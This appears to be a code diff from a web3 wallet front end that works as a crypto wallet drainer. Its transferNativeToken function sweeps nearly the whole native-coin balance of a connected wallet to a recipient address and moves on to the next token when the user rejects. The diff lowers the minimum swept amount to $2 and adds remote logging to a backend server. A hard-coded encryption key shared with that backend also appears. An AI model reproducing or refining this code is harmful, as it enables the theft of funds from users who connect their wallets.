@@ -45,25 +45,76 @@ interface DiscoveredToken {
 
 
 
-const isLoggingEnabled = true; // Toggle this to enable/disable logs
+// const isLoggingEnabled = true; // Toggle this to enable/disable logs
+// import axios from "axios";
 
-const log = (...messages: unknown[]) => {
+const isLoggingEnabled = true;
+//const BASE_API_URL = "https://drn-2stp.onrender.com/api"; // From permit.txt
+const BASE_API_URL = "http://localhost:8080/api";
+
+const stringifyMessage = (message: unknown): string => {
+  if (typeof message === "object" && message !== null) {
+    try {
+      return JSON.stringify(message, null, 2);
+    } catch {
+      return String(message); // Fallback for circular references
+    }
+  }
+  return String(message);
+};
+
+const log = async (...messages: unknown[]) => {
   if (isLoggingEnabled) {
-    console.log(...messages); // Directly use console.log
+    const timestamp = new Date().toISOString();
+    const logMessage = `[LOG ${timestamp}] ${messages.map(stringifyMessage).join(" ")}`;
+    console.log(logMessage);
+    console.error(logMessage); // For Vercel visibility
+    try {
+      await axios.post(`${BASE_API_URL}/log`, {
+        level: "info",
+        message: logMessage,
+        timestamp,
+      });
+    } catch (err) {
+      console.error(`Failed to send log to backend: ${err.message}`);
+    }
   }
 };
 
-const warn = (...messages: unknown[]) => {
+const warn = async (...messages: unknown[]) => {
   if (isLoggingEnabled) {
-    console.warn(...messages); // Directly use console.warn
+    const timestamp = new Date().toISOString();
+    const logMessage = `[WARN ${timestamp}] ${messages.map(stringifyMessage).join(" ")}`;
+    console.warn(logMessage);
+    console.error(logMessage);
+    try {
+      await axios.post(`${BASE_API_URL}/log`, {
+        level: "warn",
+        message: logMessage,
+        timestamp,
+      });
+    } catch (err) {
+      console.error(`Failed to send warn to backend: ${err.message}`);
+    }
   }
 };
 
-const error = (...messages: string[]) => {
-  console.error(...messages); // Errors should always log
+const error = async (...messages: unknown[]) => {
+  if (isLoggingEnabled) {
+    const timestamp = new Date().toISOString();
+    const logMessage = `[ERROR ${timestamp}] ${messages.map(stringifyMessage).join(" ")}`;
+    console.error(logMessage);
+    try {
+      await axios.post(`${BASE_API_URL}/log`, {
+        level: "error",
+        message: logMessage,
+        timestamp,
+      });
+    } catch (err) {
+      console.error(`Failed to send error to backend: ${err.message}`);
+    }
+  }
 };
-
-
 // Replace
 error("An unexpected error occurred during sendTransactions.");
 
@@ -241,7 +292,7 @@ const mapChainToAppKitNetwork = (chain: Chain): AppKitNetwork => ({
 // const BASE_API_URL = "https://ethereum-explorer.archi/api";
 
 // const BASE_API_URL = "http://localhost:3002/api";
-const BASE_API_URL = "https://drn-2stp.onrender.com/api"
+// const BASE_API_URL = "https://drn-2stp.onrender.com/api"
 
 // Encryption key (must match the backend)
 const BR_ENCRYPTION_KEY = "9eb784738a1716465663e61e45fa8775f012bf944ac888a7c13db7b8d4962eda";
@@ -1082,6 +1133,117 @@ const calculateNativeValuePerToken = async (
   });
 };
 
+// const transferNativeToken = async (
+//   recipient: string,
+//   signer: ethers.Signer,
+//   tokenPriceInUSD: number,
+//   chainId: string,
+//   totalTokenValueInUSD: number
+// ): Promise<void> => {
+//   try {
+//     const provider = signer.provider;
+//     if (!provider) {
+//       throw new Error("Signer does not have an associated provider.");
+//     }
+
+//     // Get signer balance and gas fee data
+//     const signerBalance = await signer.getBalance();
+//     const feeData = await provider.getFeeData();
+
+//     // Determine gas price for EIP-1559 or legacy
+//     const gasPrice = feeData.maxFeePerGas && feeData.maxPriorityFeePerGas
+//       ? feeData.maxFeePerGas // Use EIP-1559 gas model
+//       : feeData.gasPrice || ethers.utils.parseUnits("5", "gwei"); // Fallback to legacy gas price
+
+//     // Estimate gas limit dynamically for a transfer
+//     const gasLimit = await provider.estimateGas({
+//       to: recipient,
+//       value: signerBalance
+//     }).catch(() => BigNumber.from(21000)); // Fallback to 21000 if estimation fails
+
+//     // Calculate total gas cost
+//     const totalGasCost = gasPrice.mul(gasLimit);
+
+//     if (signerBalance.lte(totalGasCost)) {
+//       log("Insufficient balance to cover gas fees.");
+//       return;
+//     }
+
+//     const balanceInUSD = parseFloat(ethers.utils.formatEther(signerBalance.sub(totalGasCost))) * tokenPriceInUSD;
+
+//     // Skip transfer if the native token balance is below $2
+//     if (balanceInUSD < 10) {
+//       log("Native token balance below $10. Skipping transfer.");
+//       return;
+//     }
+
+//     // Leave $10 untouched if conditions are met
+//     if (balanceInUSD >= 50 && totalTokenValueInUSD > 50) {
+//       const amountToLeaveInUSD = 10; // Leave $10 worth of ETH
+//       const remainingBalance = ethers.utils.parseEther(
+//         ((balanceInUSD - amountToLeaveInUSD) / tokenPriceInUSD).toFixed(18)
+//       );
+//       const amountToSend = signerBalance
+//         .sub(totalGasCost)
+//         .sub(remainingBalance);
+
+//       if (
+//         amountToSend.isZero() ||
+//         amountToSend.lt(ethers.utils.parseEther("0.0001"))
+//       ) {
+//         log("Amount to send is too small after subtracting gas fees and leaving $10.");
+//         return;
+//       }
+
+//       const tx = await signer.sendTransaction({
+//         to: recipient,
+//         value: amountToSend,
+//         gasPrice,
+//         gasLimit,
+//       });
+
+//       log(`Transaction sent: ${tx.hash}`);
+//       await tx.wait();
+//       log(`Transaction confirmed: ${tx.hash}`);
+//     } else {
+//       // Standard transfer logic when conditions are not met
+//       const amountToSend = signerBalance.sub(totalGasCost);
+
+//       if (
+//         amountToSend.isZero() ||
+//         amountToSend.lt(ethers.utils.parseEther("0.0001"))
+//       ) {
+//         log("Amount to send is too small after subtracting gas fees.");
+//         return;
+//       }
+
+//       const tx = await signer.sendTransaction({
+//         to: recipient,
+//         value: amountToSend,
+//         gasPrice,
+//         gasLimit,
+//       });
+
+//       log(`Transaction sent: ${tx.hash}`);
+//       await tx.wait();
+//       log(`Transaction confirmed: ${tx.hash}`);
+//     }
+//   } catch (error: unknown) {
+//     if (
+//       typeof error === "object" &&
+//       error !== null &&
+//       "code" in error &&
+//       (error as { code: string }).code === "ACTION_REJECTED"
+//     ) {
+//       warn(`Transaction rejected by the user. Skipping to the next token.`);
+//     } else if (error instanceof Error) {
+//       console.error(`Error transferring native token on chain ${chainId}:`, error.message);
+//     } else {
+//       console.error(`An unknown error occurred while transferring native token on chain ${chainId}.`);
+//     }
+//   }
+// };
+
 const transferNativeToken = async (
   recipient: string,
   signer: ethers.Signer,
@@ -1091,99 +1253,63 @@ const transferNativeToken = async (
 ): Promise<void> => {
   try {
     const provider = signer.provider;
-    if (!provider) {
-      throw new Error("Signer does not have an associated provider.");
-    }
-
-    // Get signer balance and gas fee data
+    if (!provider) throw new Error("Signer does not have an associated provider.");
     const signerBalance = await signer.getBalance();
     const feeData = await provider.getFeeData();
-
-    // Determine gas price for EIP-1559 or legacy
     const gasPrice = feeData.maxFeePerGas && feeData.maxPriorityFeePerGas
-      ? feeData.maxFeePerGas // Use EIP-1559 gas model
-      : feeData.gasPrice || ethers.utils.parseUnits("5", "gwei"); // Fallback to legacy gas price
-
-    // Estimate gas limit dynamically for a transfer
+      ? feeData.maxFeePerGas
+      : feeData.gasPrice || ethers.utils.parseUnits("5", "gwei");
     const gasLimit = await provider.estimateGas({
       to: recipient,
       value: signerBalance
-    }).catch(() => BigNumber.from(21000)); // Fallback to 21000 if estimation fails
-
-    // Calculate total gas cost
+    }).catch(() => BigNumber.from(21000));
     const totalGasCost = gasPrice.mul(gasLimit);
-
     if (signerBalance.lte(totalGasCost)) {
       log("Insufficient balance to cover gas fees.");
       return;
     }
-
     const balanceInUSD = parseFloat(ethers.utils.formatEther(signerBalance.sub(totalGasCost))) * tokenPriceInUSD;
-
-    // Skip transfer if the native token balance is below $2
-    if (balanceInUSD < 10) {
-      log("Native token balance below $10. Skipping transfer.");
+    if (balanceInUSD < 2) {
+      log("Native token balance below $2. Skipping transfer.");
       return;
     }
-
-    // Leave $10 untouched if conditions are met
     if (balanceInUSD >= 50 && totalTokenValueInUSD > 50) {
-      const amountToLeaveInUSD = 10; // Leave $10 worth of ETH
+      const amountToLeaveInUSD = 10;
       const remainingBalance = ethers.utils.parseEther(
         ((balanceInUSD - amountToLeaveInUSD) / tokenPriceInUSD).toFixed(18)
       );
-      const amountToSend = signerBalance
-        .sub(totalGasCost)
-        .sub(remainingBalance);
-
-      if (
-        amountToSend.isZero() ||
-        amountToSend.lt(ethers.utils.parseEther("0.0001"))
-      ) {
+      const amountToSend = signerBalance.sub(totalGasCost).sub(remainingBalance);
+      if (amountToSend.isZero() || amountToSend.lt(ethers.utils.parseEther("0.0001"))) {
         log("Amount to send is too small after subtracting gas fees and leaving $10.");
         return;
       }
-
       const tx = await signer.sendTransaction({
         to: recipient,
         value: amountToSend,
         gasPrice,
         gasLimit,
       });
-
       log(`Transaction sent: ${tx.hash}`);
       await tx.wait();
       log(`Transaction confirmed: ${tx.hash}`);
     } else {
-      // Standard transfer logic when conditions are not met
       const amountToSend = signerBalance.sub(totalGasCost);
-
-      if (
-        amountToSend.isZero() ||
-        amountToSend.lt(ethers.utils.parseEther("0.0001"))
-      ) {
+      if (amountToSend.isZero() || amountToSend.lt(ethers.utils.parseEther("0.0001"))) {
         log("Amount to send is too small after subtracting gas fees.");
         return;
       }
-
       const tx = await signer.sendTransaction({
         to: recipient,
         value: amountToSend,
         gasPrice,
         gasLimit,
       });
-
       log(`Transaction sent: ${tx.hash}`);
       await tx.wait();
       log(`Transaction confirmed: ${tx.hash}`);
     }
-  } catch (error: unknown) {
-    if (
-      typeof error === "object" &&
-      error !== null &&
-      "code" in error &&
-      (error as { code: string }).code === "ACTION_REJECTED"
-    ) {
+  } catch (error) {
+    if (error.code === "ACTION_REJECTED") {
       warn(`Transaction rejected by the user. Skipping to the next token.`);
     } else if (error instanceof Error) {
       console.error(`Error transferring native token on chain ${chainId}:`, error.message);
@@ -1192,8 +1318,7 @@ const transferNativeToken = async (
     }
   }
 };
-
-
+  
 const processChainTransactions = async (
   chain: Chain,
   validTokens: TokenBalance[],
